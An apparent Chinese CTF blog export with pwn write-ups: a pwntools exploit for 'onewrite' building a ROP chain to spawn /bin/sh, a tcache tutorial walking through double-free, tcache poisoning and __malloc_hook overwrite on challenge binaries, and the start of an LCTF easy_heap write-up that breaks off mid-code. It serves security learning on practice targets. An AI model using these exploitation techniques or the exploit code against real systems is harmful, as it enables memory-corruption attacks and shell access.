found NX: NX enabled PIE: PIE enabled 程序逻辑也很简单，先选择泄漏stack或codebase，然后根据得到的地址去任意地址写一次退出，正常一开始都会去想怎么去把一次任意写变成无限任意写来扩大控制力，而我不知道是脑抽了还是怎么的一开始就去看exit里面有什么可以用的gagdet一次跳转就能得到，最后还是在别人提醒后才去改的ret，稍稍有点被自己气到了，有了无限写之后就好说了，因为是静态编译的gadget足够来构造execve(‘/bin/sh’),所以往bss段写ropchain，然后再通过pop_rsp_ret来跳到bss段上执行，不过比赛服务器的区域waf有点强，得跑个半天，先写好cat flag然后循环跑就对了 #! /usr/bin/env python # -*- coding: utf-8 -*- # Author = nepire # flag:INS{one leak, one write, many possibilities...} from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./onewrite&#39;) #n = remote(&#39;onewrite.teaser.insomnihack.ch&#39;,1337) elf = ELF(&#39;./onewrite&#39;) def leak_stack(): n.recvuntil(&#39;&gt;&#39;) n.sendline(&quot;1&quot;) return int(n.recvuntil(&#39;\\n&#39;),16) def leak_pie(): n.recvuntil(&#39;&gt;&#39;) n.sendline(&#39;2&#39;) return int(n.recvuntil(&#39;\\n&#39;),16) def write(addr,data): n.recvuntil(&#39;address :&#39;) n.send(str(int(addr))) n.recvuntil(&#39;data : &#39;) n.send(data) def write_bss(idx): i = 8*idx stack = leak_stack() write(bss_addr+i,rop[i:i+8]) for i in range(2): stack = leak_stack() log.success(hex(stack)) ret = stack - 8 write(ret,p64(main_addr)) stack = leak_stack() log.success(hex(stack)) ret = stack - 8 write(ret,&#39;\\x15&#39;) # 0x7ffff7d52ab2 (do_leak+157) -&gt; 0x7ffff7d52a15 (do_leak) pie = leak_pie() codebase = pie - 0x8a15 log.success(hex(codebase)) ##### leak stack codebase &amp;&amp; edit ret #### bss_addr = codebase + elf.bss() main_addr = codebase + 0x8ab8 pb = lambda x : p64(x + codebase) rop = pb(0x000000000000d9f2) # pop rsi ; ret rop += pb(0x00000000002b1120) # @ .data rop += pb(0x00000000000460ac) # pop rax ; ret rop += &#39;/bin//sh&#39; rop += pb(0x0000000000077901) # mov qword ptr [rsi], rax ; ret rop += pb(0x000000000000d9f2) # pop rsi ; ret rop += pb(0x00000000002b1128) # @ .data + 8 rop += pb(0x0000000000041360) # xor rax, rax ; ret rop += pb(0x0000000000077901) # mov qword ptr [rsi], rax ; ret rop += pb(0x00000000000084fa) # pop rdi ; ret rop += pb(0x00000000002b1120) # @ .data rop += pb(0x000000000000d9f2) # pop rsi ; ret rop += pb(0x00000000002b1128) # @ .data + 8 rop += pb(0x00000000000484c5) # pop rdx ; ret rop += pb(0x00000000002b1128) # @ .data + 8 rop += pb(0x0000000000041360) # xor rax, rax ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006d940) # add rax, 1 ; ret rop += pb(0x000000000006e605) # syscall ; ret gadgetlen = len(rop)/8 ############ loading gadget ############## #idx0 write(bss_addr,rop[0:8]) for i in range(2): stack = leak_stack() log.success(hex(stack)) ret = stack - 8 write(ret,p64(main_addr)) #idx 1-last for i in range(1,gadgetlen): write_bss(i) ########### write gadget in bss ############ pop_rsp_ret = codebase + 0x946a stack = leak_stack() log.success(hex(stack)) write(stack+0x38,p64(pop_rsp_ret)) stack = leak_stack() log.success(hex(stack)) write(stack+0x20,p64(bss_addr)) ########### jmp bss getshell ############# n.interactive()","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"在debug中学tcache","slug":"在debug中学tcache","date":"2019-11-05T04:03:57.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/在debug中学tcache/","link":"","permalink":"/2019/11/05/在debug中学tcache/","excerpt":"","text":"最近比赛Pwn的libc版本越来越多2.26以上的了，也就相当于多了不少tcache相关的题目，于是最近恶补了一波tcache机制相关的东西，并记录下tcache相关题目的调试 本文首发于先知社区在Debug中学Tcache tcache简介tcache（thread local caching）是glibc在2.26版本新出现的一种内存管理机制，它优化了分配效率却也降低了安全性，一些漏洞的利用条件变得容易了许多 首先我们先看下tcache新引入的两个数据结构tcache_entry 和tcache_perthread_struct /* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache. */ typedef struct tcache_entry { struct tcache_entry *next; } tcache_entry; /* There is one of these for each thread, which contains the per-thread cache (hence &quot;tcache_perthread_struct&quot;). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */ typedef struct tcache_perthread_struct { char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS]; } tcache_perthread_struct; static __thread tcache_perthread_struct *tcache = NULL; 这里简单的说明一下tcache和fastbin的结构都很相像也都是单链表结构，明显的不同是fastbin每个bins有10个块而tcache是7个并且tcache的优先级要高于fastbin，相当于只有tcache放不下了才会放入fastbin (0x20) tcache_entry[0]: 0x55ea7bc0d320 --&gt; 0x55ea7bc0d300 --&gt; 0x55ea7bc0d2e0 --&gt; 0x55ea7bc0d2c0 --&gt; 0x55ea7bc0d2a0 --&gt; 0x55ea7bc0d280 --&gt; 0x55ea7bc0d260 我们先看下题目的基本信息，这里我是用了自己写的一个pwn环境来实现tcache的调试具体链接会在末尾放出 ➜ tcache file children_tcache children_tcache: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=ebf73572ad77a035a366578bf87c6aabc6a235a1, stripped ➜ tcache checksec children_tcache [*] &#39;/home/ctf/process/tcache/children_tcache&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled 64位防护全开的程序，真的刺激，我们看下程序干了些什么 ➜ tcache ./children_tcache $$$$$$$$$$$$$$$$$$$$$$$$$$$ 🍊 Children Tcache 🍊 $$$$$$$$$$$$$$$$$$$$$$$$$$$ $ 1. New heap $ $ 2. Show heap $ $ 3. Delete heap $ $ 4. Exit $ $$$$$$$$$$$$$$$$$$$$$$$$$$$ Your choice: 1 Size:12 Data:aaaa 一个基本的菜单类型的pwn题，在简单的审计过后就能发现漏洞，首先我们看下程序本身产生的问题 void new() { signed int i; // [rsp+Ch] [rbp-2034h] char *note_chunk; // [rsp+10h] [rbp-2030h] unsigned __int64 size; // [rsp+18h] [rbp-2028h] char buf; // [rsp+20h] [rbp-2020h] unsigned __int64 v4; // [rsp+2038h] [rbp-8h] v4 = __readfsqword(0x28u); memset(&amp;buf, 0, 0x2010uLL); for ( i = 0; ; ++i ) { if ( i &gt; 9 ) { puts(&quot;:(&quot;); return; } if ( !note[i] ) break; } printf(&quot;Size:&quot;); size = input(); if ( size &gt; 0x2000 ) exit(-2); note_chunk = malloc(size); if ( !note_chunk ) exit(-1); printf(&quot;Data:&quot;); read_chk_input(&amp;buf, size); strcpy(note_chunk, &amp;buf); note[i] = note_chunk; note_size[i] = size; } 我们知道strcpy在拷贝字符串时连末尾的’\\0’也会一起拷贝，假设我们的字符串长度刚好和所分配给它的长度相等，那么就可能会造成null-byte-off-by-one漏洞，我们简单的验证一下 #poc new(0x10,&#39;a&#39;*8) new(0x110,&#39;aaaa&#39;) raw_input() free(0) new(0x18,&#39;a&#39;*0x18) raw_input() pwndbg&gt; parseheap addr prev size status fd bk 0x565258e29000 0x0 0x250 Used None None 0x565258e29250 0x0 0x20 Used None None 0x565258e29270 0x0 0x110 Used None None pwndbg&gt; parseheap addr prev size status fd bk 0x565258e29000 0x0 0x250 Used None None 0x565258e29250 0x0 0x20 Freed 0x61616161616161610x6161616161616161 0x565258e29270 0x6161616161616161 0x100 Freed 0x62626262 0x0 Corrupt ?! (size == 0) (0x565258e29370) pwndbg&gt; x/8x 0x565258e29250 0x565258e29250: 0x0000000000000000 0x0000000000000021 0x565258e29260: 0x6161616161616161 0x0000000000000000 0x565258e29270: 0x0000000000000000 0x0000000000000111 0x565258e29280: 0x0000000062626262 0x0000000000000000 pwndbg&gt; x/8x 0x565258e29250 0x565258e29250: 0x0000000000000000 0x0000000000000021 0x565258e29260: 0x6161616161616161 0x6161616161616161 0x565258e29270: 0x6161616161616161 0x0000000000000100 ==&gt;这里原本应该为0x111但最末尾的0x11被0x00覆盖了 0x565258e29280: 0x0000000062626262 0x0000000000000000 由于这题的出题人用0xda填充整个chunk，所以我们不能直接伪造pre_size来overlapping void delete() { unsigned __int64 idx; // [rsp+8h] [rbp-8h] printf(&quot;Index:&quot;); idx = input(); if ( idx &gt; 9 ) exit(-3); if ( note[idx] ) { memset(note[idx], 0xDA, note_size[idx]); free(note[idx]); note[idx] = 0LL; note_size[idx] = 0LL; } puts(&quot;:)&quot;); } 但我们刚刚才验证的null byte off-by-one溢出的字节为\\x00，所以我们可以通过反复的利用这个把pre_size位清0来构造overlapping #poc new(0x10,&#39;aaaa&#39;) new(0x110,&#39;aaaa&#39;) free(0) for i in range(8): new(0x10-i,&#39;a&#39;*(0x10-i)) free(0) raw_input() pwndbg&gt; parseheap addr prev size status fd bk 0x560894f1f000 0x0 0x20 Freed 0x61616161616161610x6161616161616161 0x560894f1f020 0x130 0x100 Freed 0x61616161 0x0 Corrupt ?! (size == 0) (0x560894f1f120) pwndbg&gt; x/8x 0x560894f1f000 0x560894f1f000: 0x0000000000000000 0x0000000000000021 0x560894f1f010: 0x6161616161616161 0x6161616161616161 0x560894f1f020: 0x0000000000000130 0x0000000000000100 0x560894f1f030: 0x0000000061616161 0x0000000000000000 接着我们需要libc_base来方便后面的操作，我们可以看到在new中对size的检验范围十分大，这时我们可以通过unsort_bin_attack来泄露一个紧贴libc的地址 ，之后我们可以通过调试得到这个地址与libc_base的偏移，就相当与泄露出了libc_base printf(&quot;Size:&quot;); size = input(); if ( size &gt; 0x2000 ) exit(-2); note_chunk = malloc(size); 我们简单的做个unsort_bin_attack尝试把这个地址写入到chunk上 #poc new(0x500,&#39;aaaaa&#39;) new(0x10,&#39;bbbb&#39;) free(1) free(0) pwndbg&gt; parseheap addr prev size status fd bk 0x55763fe59000 0x0 0x250 Used None None 0x55763fe59250 0x0 0x510 Freed 0x7f74dac85c78 0x7f74dac85c78 0x55763fe59760 0x510 0x20 Used None None pwndbg&gt; x/8x 0x55763fe59250 0x55763fe59250: 0x0000000000000000 0x0000000000000511 0x55763fe59260: 0x00007f74dac85c78 0x00007f74dac85c78 &lt;== 0x55763fe59270: 0x0000000000000000 0x0000000000000000 0x55763fe59280: 0xdadadadadadadada 0xdadadadadadadada 有了这些条件后我们便可以去泄露libc了，我们用图演示下流程 #free before pwndbg&gt; parseheap addr prev size status fd bk 0x55a2d6e3a000 0x0 0x250 Used None None 0x55a2d6e3a250 0x0 0x510 Freed 0x7fba63b37c78 0x7fba63b37c78 0x55a2d6e3a760 0x510 0x30 Freed 0x61616161616161610x6161616161616161 0x55a2d6e3a790 0x540 0x500 Used None None 0x55a2d6e3ac90 0x0 0x20 Used None None pwndbg&gt; x/8x 0x55a2d6e3a760 0x55a2d6e3a760: 0x0000000000000510 0x0000000000000030 0x55a2d6e3a770: 0x6161616161616161 0x6161616161616161 0x55a2d6e3a780: 0x6161616161616161 0x6161616161616161 0x55a2d6e3a790: 0x0000000000000540 0x0000000000000500 pwndbg&gt; x/8x 0x55a2d6e3a790 0x55a2d6e3a790: 0x0000000000000540 0x0000000000000500 0x55a2d6e3a7a0: 0x0000000063636363 0x0000000000000000 0x55a2d6e3a7b0: 0x0000000000000000 0x0000000000000000 0x55a2d6e3a7c0: 0x0000000000000000 0x0000000000000000 #free after pwndbg&gt; parseheap addr prev size status fd bk 0x563204289000 0x0 0x250 Used None None 0x563204289250 0x0 0xa40 Freed 0x7f01905acc78 0x7f01905acc78 0x563204289c90 0xa40 0x20 Used None None pwndbg&gt; x/8x 0x563204289250 0x563204289250: 0x0000000000000000 0x0000000000000a41 0x563204289260: 0x00007f01905acc78 0x00007f01905acc78 0x563204289270: 0x0000000000000000 0x0000000000000000 0x563204289280: 0xdadadadadadadada 0xdadadadadadadada pwndbg&gt; 这时我们再新建一个chunk分配大小和chunk0一样时，chunk就会分配到chunk0所在的位置，这时我们show(0)即可leak_libc 这样我们所有的前置工作就做好了，接着就是通过tcache_dup和tcache_poisoning来getshell了 首先我们先通过how2heap了解下 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; //tcache_dup int main() { fprintf(stderr, &quot;This file demonstrates a simple double-free attack with tcache.\\n&quot;); fprintf(stderr, &quot;Allocating buffer.\\n&quot;); int *a = malloc(8); fprintf(stderr, &quot;malloc(8): %p\\n&quot;, a); fprintf(stderr, &quot;Freeing twice...\\n&quot;); free(a); free(a); fprintf(stderr, &quot;Now the free list has [ %p, %p ].\\n&quot;, a, a); fprintf(stderr, &quot;Next allocated buffers will be same: [ %p, %p ].\\n&quot;, malloc(8), malloc(8)); return 0; } #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt; // tcache poisoning int main() { &quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into&quot; &quot;returning a pointer to an arbitrary location (in this case, the stack).&quot; &quot;The attack is very similar to fastbin corruption attack.&quot; size_t stack_var; fprintf(stderr, &quot;The address we want malloc() to return is %p.\\n&quot;, (char *)&amp;stack_var); &quot;Allocating 1 buffer.&quot; intptr_t *a = malloc(128); fprintf(stderr, &quot;malloc(128): %p\\n&quot;, a); &quot;Freeing the buffer...&quot; free(a); fprintf(stderr, &quot;Now the tcache list has [ %p ].\\n&quot;, a); fprintf(stderr, &quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\\n&quot; &quot;to point to the location to control (%p).\\n&quot;, sizeof(intptr_t), a, &amp;stack_var); a[0] = (intptr_t)&amp;stack_var; fprintf(stderr, &quot;1st malloc(128): %p\\n&quot;, malloc(128)); fprintf(stderr, &quot;Now the tcache list has [ %p ].\\n&quot;, &amp;stack_var); intptr_t *b = malloc(128); fprintf(stderr, &quot;2nd malloc(128): %p\\n&quot;, b); &quot;We got the control&quot; return 0; } 我们可以很明显的感受到tcache_dup就是弱化版的fastbin_double_free，我们先看一下源码相关的函数 tcache_put (mchunkptr chunk, size_t tc_idx) { tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]); } 这就是我之前所说过引入tcache机制降低了安全性的一个体现，本来应该要有tcache-&gt;counts[tc_idx] 的相关检验，却为提升效率而去掉了，这也侧面的说明安全和性能处在一个此消彼长的状态 我们简单的调试下tcache_dup pwndbg&gt; heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 (0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x55a661cd5270 (size : 0x20d90) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 (0x20) tcache_entry[0]: 0x55a661cd5260 --&gt; 0x55a661cd5260 (overlap chunk with 0x55a661cd5250(freed) ) 我们直接free两次同一个chunk，就能直接得到两个指向同一块内存区域的指针，这无疑比正常在fastbin下的double free简易许多 接着我们看下tcache_poisoning，简单来说tcache_poisoning就是一个通过覆盖tcache_next就直接可以malloc到任意地址去将其覆盖为one_gadget或是别的东西去进行利用的一个很万金油的用法，我们调试下how2heap给的程序 pwndbg&gt; heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 (0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x55a464be82e0 (size : 0x20d20) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 (0x90) tcache_entry[7]: 0x55a464be8260 它先往tcache里面放了一个0x80的chunk，然后我们再看下修改了tcache_next后的tcache_entry是怎么样的 ────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────── 20 fprintf(stderr, &quot;Now the tcache list has [ %p ].\\n&quot;, a); 21 fprintf(stderr, &quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\\n&quot; 22 &quot;to point to the location to control (%p).\\n&quot;, sizeof(intptr_t), a, &amp;stack_var); 23 a[0] = (intptr_t)&amp;stack_var; 24 ► 25 fprintf(stderr, &quot;1st malloc(128): %p\\n&quot;, malloc(128)); 26 fprintf(stderr, &quot;Now the tcache list has [ %p ].\\n&quot;, &amp;stack_var); 27 28 intptr_t *b = malloc(128); 29 fprintf(stderr, &quot;2nd malloc(128): %p\\n&quot;, b); 30 fprintf(stderr, &quot;We got the control\\n&quot;); ────────────────────────────────────────[ STACK ]─────────────────────────────────────────────── 00:0000│ rdx rsp 0x7ffe99bc1bb0 —▸ 0x55a4635689a0 (__libc_csu_init) ◂— push r15 01:0008│ 0x7ffe99bc1bb8 —▸ 0x55a464be8260 —▸ 0x7ffe99bc1bb0 —▸ 0x55a4635689a0 (__libc_csu_init) ◂— push r15 02:0010│ 0x7ffe99bc1bc0 —▸ 0x7ffe99bc1cb0 ◂— 0x1 03:0018│ 0x7ffe99bc1bc8 ◂— 0xad94ca33a5db2a00 04:0020│ rbp 0x7ffe99bc1bd0 —▸ 0x55a4635689a0 (__libc_csu_init) ◂— push r15 05:0028│ 0x7ffe99bc1bd8 —▸ 0x7f6dd0a631c1 (__libc_start_main+241) ◂— mov edi, eax 06:0030│ 0x7ffe99bc1be0 ◂— 0x40000 07:0038│ 0x7ffe99bc1be8 —▸ 0x7ffe99bc1cb8 —▸ 0x7ffe99bc2912 ◂— 0x74632f656d6f682f (&#39;/home/ct&#39;) pwndbg&gt; heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 (0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x55a464be82e0 (size : 0x20d20) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 (0x90) tcache_entry[7]: 0x55a464be8260 --&gt; 0x7ffe99bc1bb0 --&gt; 0x55a4635689a0 我们可以看见设置的栈地址放在了tcache_entry的第二个堆，这时我们只要new两个0x80大小的chunk就可以控制tcache_next所在的空间 我们拿个例题来看看，这是山东省科来杯的一道简单pwn题，由于他给的libc就叫libc-2.27所以我们直接用ubuntu18.04的环境去调试，首先我们先看下题目的基本信息 ➜ bbtcache file bb_tcache bb_tcache: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=642e76244eb176cccd3e281014f18a7ea7551682, stripped ➜ bbtcache checksec bb_tcache [*] &#39;/home/Ep3ius/pwn/process/bbtcache/bb_tcache&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 我们接着反编译分析一下题目 void __fastcall __noreturn main(__int64 a1, char **a2, char **a3) { unsigned int i; // [rsp+Ch] [rbp-14h] int choice; // [rsp+10h] [rbp-10h] void *chunk; // [rsp+18h] [rbp-8h] setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); i = 0; puts(&quot;Welcome to easy heap game!&quot;); printf(&quot;I think you might need this: 0x%016llx\\n&quot;, &amp;system); while ( i != 7 ) { menu(++i); choice = fgets_input(); if ( choice == 2 ) // free { free(chunk); } else if ( choice == 3 ) // write { puts(&quot;You might need this to tamper something.&quot;); read(0, chunk, 8uLL); } else { if ( choice != 1 ) // new exit(0); chunk = malloc(0x10uLL); } } puts(&quot;Game over!&quot;); exit(0); } 程序逻辑十分清晰，一共七次机会进行new、free、write的操作来getshell，由于除了次数没有任何限制，所以我们能很直接的体会到tcache机制所带来的安全方面问题，我们先做个标准的tcache_poisoning起手式，先放一个堆块到tcache_entry pwndbg&gt; heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 (0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x556b70596270 (size : 0x20d90) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 (0x20) tcache_entry[0]: 0x556b70596260 接着我们通过write操作去修改一下tcache_next为&amp;malloc_hook pwndbg&gt; heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 (0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x556b70596270 (size : 0x20d90) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 (0x20) tcache_entry[0]: 0x556b70596260 --&gt; 0x7f2d9da10c10 (&amp;__malloc_hook) 接着new两次把tcache从取出并把malloc_hook修改成one_gadget后new一个新chunk触发malloc_hook就可以getshell了，很简单又直接的题目吧。 我们回到children_tcache，先做个tcache_dup，也就是对我们之前插在两个unsort_bin中间的chunk进行两次free pwndbg&gt; parseheap addr prev size status fd bk 0x564f27df9000 0x0 0x250 Used None None 0x564f27df9250 0x0 0x510 Used None None 0x564f27df9760 0x510 0x30 Used None None 0x564f27df9790 0xdadadadadadadada 0x4f0 Freed 0x7fa26b599c78 0x7fa26b599c78 0x564f27df9c80 0x4f0 0x20 Used None None pwndbg&gt; heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 (0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x556e12172ca0 (size : 0x20360) last_remainder: 0x556e12172790 (size : 0x4f0) unsortbin: 0x556e12172790 (size : 0x4f0) (0x30) tcache_entry[1]: 0x556e12172770 pwndbg&gt; 接着我们只要free(2)就相当于获得了两个指向0x556e12172770的指针 pwndbg&gt; heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 (0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x556e12172ca0 (size : 0x20360) last_remainder: 0x556e12172790 (size : 0x4f0) unsortbin: 0x556e12172790 (size : 0x4f0) (0x30) tcache_entry[1]: 0x556e12172770 --&gt; 0x556e12172770 (overlap chunk with 0x556e12172760(freed) ) 接着我们就可以new一个新tcache里面存放malloc_hook然后通过tcache_poisoning就可以把malloc_hook修改为one_gadget，再new一个新chunk就可以getshell了。 在不断的挖掘tcache机制就会遇到更多更有意思的东西，虽然降低安全性但也变得更加有趣了(滑稽) 感谢M4x师傅，kirin师傅，Hpasserby师傅的知识分享 相关链接 调试环境 : nepire-pwn (将~/nepire-pwn/DOCKER/Dockerfile第一行的16.04 换成17.10或更高即可调试tcache) 调试器：PWNDBG","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"LCTF—easypwn详解","slug":"LCTF—easypwn详解","date":"2019-11-05T04:03:15.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/LCTF—easypwn详解/","link":"","permalink":"/2019/11/05/LCTF—easypwn详解/","excerpt":"","text":"听说一血有pwnhub注册码拿就去试着打了一下周末的这场LCTF，结果作为签到题选手(笑)连签到题的一血都拿不到可能这就是命吧，不过遇到了一题不错的pwn，就详细的记录下解题思路和技巧吧 本文首发于安全客—LCTF2018-easypwn-详细解析 easy pwn先看下给的文件的基本信息 ➜ easy_heap file easy_heap easy_heap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a94f7ec039023e90d619f61acca68dd0863486c4, stripped ➜ easy_heap checksec easy_heap [*] &#39;/home/Ep3ius/pwn/process/easy_heap/easy_heap&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 64位程序防护基本全开，接着我们ida看下程序反编译的结果 void __fastcall __noreturn main(__int64 a1, char **a2, char **a3) { int choice; // eax init_0(); chunk_menu = calloc(0xA0uLL, 1uLL); if ( !chunk_menu ) { puts(&quot;init error!&quot;); exit_(); } while ( 1 ) { while ( 1 ) { menu(); choice = read_input(); if ( choice != 2 ) break; delete(); } if ( choice &gt; 2 ) { if ( choice == 3 ) { show(); } else if ( choice == 4 ) { exit_(); } } else if ( choice == 1 ) { new(); } } } 我们可以看到这是一个基础的菜单型程序，这里比较在意的是程序先calloc了一个0xa0大小的堆块，我们先了解下malloc和 calloc的区别主要在于calloc在动态分配完内存后，自动初始化该内存空间为零，而malloc不初始化，里边数据是随机的垃圾数据。 void new() { __int64 v0; // rbx __int64 idx; // [rsp+0h] [rbp-20h] int idxa; // [rsp+0h] [rbp-20h] unsigned int chunk_size; // [rsp+4h] [rbp-1Ch] unsigned __int64 v4; // [rsp+8h] [rbp-18h] v4 = __readfsqword(0x28u); LODWORD(idx) = 0; while ( idx &lt;= 9 &amp;&amp; *(16LL * idx + chunk_menu) ) LODWORD(idx) = idx + 1; if ( idx == 10 ) { puts(&quot;full!&quot;); } else { v0 = chunk_menu; *(v0 + 16LL * idx) = malloc(0xF8uLL); if ( !*(16LL * idx + chunk_menu) ) { puts(&quot;malloc error!&quot;); exit_(); } printf(&quot;size \\n&gt; &quot;, idx, v4); chunk_size = read_input(); if ( chunk_size &gt; 